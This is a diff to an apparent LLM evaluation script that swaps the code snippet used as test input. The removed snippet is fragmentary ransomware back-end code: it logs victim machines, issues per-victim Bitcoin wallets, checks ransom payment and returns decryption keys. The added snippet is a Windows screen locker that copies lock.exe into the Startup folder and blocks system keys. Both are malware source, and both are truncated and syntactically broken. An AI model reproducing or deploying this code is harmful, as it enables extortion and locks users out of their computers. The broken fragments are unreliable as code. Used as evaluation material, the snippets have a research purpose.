@@ -294,235 +294,34 @@ class LLM_Evaluate:
 
 if __name__ == "__main__":
     code_snippet = r'''
-from cryptography.hazmat.primitives.asymmetric import (
-    rsa,
-    ec,
-    padding as asymmetric_padding,
-)
-from cryptography.hazmat.primitives import hashes, serialization
-from cryptography.hazmat.backends import default_backend
-class ECC:
-        return serialized_public_key
-class RSA:
-    def decrypt_data(self, encrypted_data):
-        unencrypted_data = self._private_key.decrypt(
-            encrypted_data, self._get_padding()
-        )
-        return unencrypted_data
-        return serialized_public_key
-import sqlite3
-import logging
-def create_connection():
-    try:
-        connection = sqlite3.connect("data.db")
-        return connection
-    except Exception as err:
-        raise err
-def create_tables():
-    connection = create_connection()
-    cursor = connection.cursor()
-    statistics_table = """CREATE TABLE IF NOT EXISTS `statistics` (`client_id` VARCHAR(100) NOT NULL,`platform` VARCHAR(75) DEFAULT NULL,`architecture` VARCHAR(75) DEFAULT NULL,`ip_address` VARCHAR(75) DEFAULT NULL,`mac_address` VARCHAR(75) DEFAULT NULL,`device_name` VARCHAR(75) DEFAULT NULL,`username` VARCHAR(75) DEFAULT NULL,`is_admin` BOOLEAN DEFAULT NULL DEFAULT NULL, `created_time` TIMESTAMP DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (`client_id`));"""
-    cursor.execute(statistics_table)
-    bitcoin_details = """CREATE TABLE IF NOT EXISTS `bitcoin_details` (`client_id` VARCHAR(100) NOT NULL,`wallet_address` VARCHAR(1000) NOT NULL,`public_key` VARCHAR(1000) NOT NULL,`wif_private_key` VARCHAR(1000) NOT NULL, `created_time` TIMESTAMP DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (`client_id`,`wallet_address`));"""
-    cursor.execute(bitcoin_details)
-    payment_details = """CREATE TABLE IF NOT EXISTS `payment_details` (`client_id` VARCHAR(100) NOT NULL,`payee_address` VARCHAR(1000) NOT NULL,`is_decrypted` BOOLEAN NOT NULL, `created_time` TIMESTAMP DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (`client_id`));"""
-    cursor.execute(payment_details)
-    connection.commit()
-    connection.close()
-def insert_statistics_to_database(statistics):
-    try:
-        logger.info("Inserting statistics into database")
-        connection = create_connection()
-        cursor = connection.cursor()
-        statistics_insert_query = "INSERT INTO `statistics` (client_id, platform, architecture, ip_address, mac_address, device_name, username, is_admin) VALUES (:client_id, :platform, :architecture, :ip_address, :mac_address, :device_name, :username, :is_admin);"
-        cursor.execute(statistics_insert_query, statistics)
-        connection.commit()
-        connection.close()
-    except sqlite3.IntegrityError as err:
-        logger.error(f"{err}: Client ID already present")
-def insert_bitcoin_details_to_database(
-    client_id, wallet_address, wif_encoded_private_key, public_key
-    connection = create_connection()
-    cursor = connection.cursor()
-    bitcoin_details_insert_query = "INSERT INTO `bitcoin_details` (client_id, wallet_address, public_key, wif_private_key) VALUES (?, ?, ?, ?);"
-    cursor.execute(
-        [client_id, wallet_address, public_key, wif_encoded_private_key],
-    )
-    connection.commit()
-    connection.close()
-def get_bitcoin_wallet_id_database(client_id):
-    connection = create_connection()
-    cursor = connection.cursor()
-    wallet_query = "SELECT wallet_address FROM `bitcoin_details` where client_id = ?;"
-    result = cursor.execute(wallet_query, [client_id])
-    id = result.fetchone()
-    connection.close()
-    if id is not None:
-        return id[0]
-def insert_payment_details_into_database(client_id, payee_wallet_address):
-    connection = create_connection()
-    cursor = connection.cursor()
-    payment_details_insert_query = "INSERT INTO `payment_details`(client_id, payee_address, is_decrypted) VALUES (?, ?, ?)"
-    cursor.execute(
-        payment_details_insert_query, [client_id, payee_wallet_address, True]
-    )
-    connection.commit()
-    connection.close()
-import hashlib
-import logging
-import blockcypher
-from asymmetric_encryption import ECC
-from db import (
-    insert_bitcoin_details_to_database,
-    get_bitcoin_wallet_id_database,
-    insert_payment_details_into_database,
-)
-def sha256(data):
-    sha256 = hashlib.sha256()
-    sha256.update(data)
-    return sha256.hexdigest()
-def ripemd160(data):
-    ripemd160 = hashlib.new("ripemd160")
-    ripemd160.update(data)
-    return ripemd160.hexdigest()
-def b58encode(data):
-    alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
-    b58_string = ""
-    leading_zeros = len(data) - len(data.lstrip("0"))
-    address_int = int(data, 16)
-    while address_int > 0:
-        digit = address_int % 58
-        digit_char = alphabet[digit]
-        b58_string = digit_char + b58_string
-        address_int //= 58
-    ones = leading_zeros // 2
-    for _ in range(ones):
-        b58_string = "1" + b58_string
-    return b58_string
-def generate_bitcoin_wallet_address(public_key):
-    hashed_public_key_hex = ripemd160(bytes.fromhex(sha256(public_key)))
-    key_with_network_byte = f"00{hashed_public_key_hex}"
-    checksum = sha256(bytes.fromhex(sha256(bytes.fromhex(key_with_network_byte))))
-    address_in_hex_format = f"{key_with_network_byte}{checksum[:8]}"
-    wallet_address = b58encode(address_in_hex_format)
-    return wallet_address
-def encode_private_key_in_wif(private_key):
-    private_key_in_hex = private_key.hex()
-    network_byte = "80"
-    first_four_bytes_of_checksum = sha256(
-        bytes.fromhex(sha256(bytes.fromhex(f"{network_byte}{private_key_in_hex}")))
-    )[0:8]
-    key_in_hex = f"{network_byte}{private_key_in_hex}{first_four_bytes_of_checksum}"
-    key_in_wif = b58encode(key_in_hex)
-    return key_in_wif
-def generate_bitcoin_address(client_id):
-    logger.info(f"Generating bitcoin payment addresses for {client_id}")
-    cipher = ECC()
-    serialized_private_key = cipher.private_key
-    serialized_public_key = cipher.public_key
-    wallet_address = get_bitcoin_wallet_id_database(client_id)
-    if wallet_address:
-        return wallet_address
-    wallet_address = generate_bitcoin_wallet_address(serialized_public_key)
-    wif_encoded_private_key = encode_private_key_in_wif(serialized_private_key)
-    insert_bitcoin_details_to_database(
-        serialized_public_key.decode(),
-    )
-    logger.info(f"Successfully inserted bitcoin details for {client_id}")
-    return wallet_address
-def verify_payment(client_id, assigned_wallet_address, payee_wallet_address):
-    if not assigned_wallet_address == get_bitcoin_wallet_id_database(client_id):
-        logger.error("Given wallet address does not match with assigned wallet address")
-        return None
-    address_details = blockcypher.get_address_overview(assigned_wallet_address)
-    if address_details.get("balance") > 5328:
-        insert_payment_details_into_database(client_id, payee_wallet_address)
-        return True
-    return True  # For testing
-import logging
-import random
-from flask import Flask, request, json, Response
-from werkzeug import exceptions
-from utils import process_request
-from db import create_tables
-def initialise():
-    return process_request(request, "initialise")
-def decrypt():
-    return process_request(request, "decrypt")
-import logging
-import requests
-import ipaddress
-import random
-from asymmetric_encryption import RSA
-from base64 import b64encode, b64decode
-from payment import verify_payment, generate_bitcoin_address
-from db import insert_statistics_to_database
-from validation import validate_decryption_request, validate_initialisation_request
-def decrypt_rsa_data(encrypted_key):
-    logger.info("Decrypting RSA data")
-    cipher = RSA()
-    unencrypted_local_private_key = b"".join(
-        [cipher.decrypt_data(key_part) for key_part in encrypted_key]
-    )
-    payload = {"key": b64encode(unencrypted_local_private_key).decode("ascii")}
-    logger.info(f"Returning Payload: {payload}")
-    return payload
-def unpack_decrypt_request(request_parameters):
-    client_id = request_parameters.get("client_id")
-    private_key = [b64decode(part) for part in request_parameters.get("private_key")]
-    assigned_wallet_address = b64decode(
-        request_parameters.get("assigned_wallet_address")
-    ).decode()
-    payee_wallet_address = b64decode(
-        request_parameters.get("payee_wallet_address")
-    ).decode()
-    return client_id, private_key, assigned_wallet_address, payee_wallet_address
-def unpack_initialise_request(request_parameters):
-    client_id = request_parameters.get("client_id")
-    statistics = request_parameters.get("statistics")
-    return client_id, statistics
-def format_and_insert_statistics_to_database(client_id, statistics, request):
-    statistics["client_id"] = client_id
-    if request.headers.getlist("X-Forwarded-For"):
-        ip = ipaddress.ip_address(request.headers.getlist("X-Forwarded-For")[0])
+import keyboard
+import mouse
+import shutil
+import os
+BizimDosyaAdiExeUzantili = "lock.exe"
+def find(name, path):
+    for root, dirs, files in os.walk(path):
+        if name in files:
+            return os.path.join(root, name)
+def BaslangicaTasi():
+    hedefKonum = os.path.expanduser('~/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup')
+    oradaMi = hedefKonum + "/" + BizimDosyaAdiExeUzantili
+    aramaSonucu = find(BizimDosyaAdiExeUzantili, "C:")
+    if(aramaSonucu != None):
+        if not os.path.isfile(oradaMi):
+            shutil.move(os.path.join(aramaSonucu), hedefKonum)
     else:
-        ip = ipaddress.ip_address(request.remote_addr)
-    statistics["ip_address"] = str(ip)
-    insert_statistics_to_database(statistics)
-def process_request(request, request_type):
-    parameters = request.get_json()
-    if request_type == "initialise" and validate_initialisation_request(parameters):
-        client_id, statistics = unpack_initialise_request(parameters)
-        wallet_id = generate_bitcoin_address(client_id)
-        format_and_insert_statistics_to_database(client_id, statistics, request)
-        return {"client_id": client_id, "wallet_id": wallet_id}
-    elif request_type == "decrypt" and validate_decryption_request(parameters):
-        client_id, private_key, assigned_wallet_address, payee_wallet_address = unpack_decrypt_request(parameters)
-        if verify_payment(client_id, assigned_wallet_address, payee_wallet_address):
-            return decrypt_rsa_data(private_key)
-import logging
-from cerberus import Validator
-from werkzeug.exceptions import BadRequest
-initialisation_parameters = {
-}
-decryption_parameters = {
-}
-def validate_decryption_request(parameters):
-    logger.info("Validating decrypt parameters")
-    decryption_validator = Validator(decryption_parameters)
-    result = decryption_validator.validate(parameters)
-    if result:
-        return True
-    logger.error("Validation Failed: {0}".format(decryption_validator.errors))
-    raise BadRequest
-def validate_initialisation_request(parameters):
-    logger.info("Validating initialisation parameters")
-    initialisation_validator = Validator(initialisation_parameters)
-    result = initialisation_validator.validate(parameters)
-    if result:
-        return True
-    logger.error("Validation Failed: {0}".format(initialisation_validator.errors))
-    raise BadRequest
+        aramaSonucu = find(BizimDosyaAdiExeUzantili, "D:")
+        if not os.path.isfile(oradaMi):
+            shutil.move(os.path.join(aramaSonucu), hedefKonum)
+def KlavyeyiKilitle():
+    engellenecekTuslar = {'alt','escape','delete','backspace', 'alt gr', 'ctrl', 'left alt', 'left ctrl', 'left shift', 'left windows', 'right alt', 'right ctrl', 'right shift', 'right windows', 'shift', 'windows'}
+    for herBirTus in engellenecekTuslar:
+        keyboard.block_key(herBirTus)
+def kapat():
+    fareyiKilitle = False
+keyboard.add_word_listener('hesoyam', kapat, triggers=['space', 'enter'], match_suffix=True, timeout=3)
+
 
 
 '''
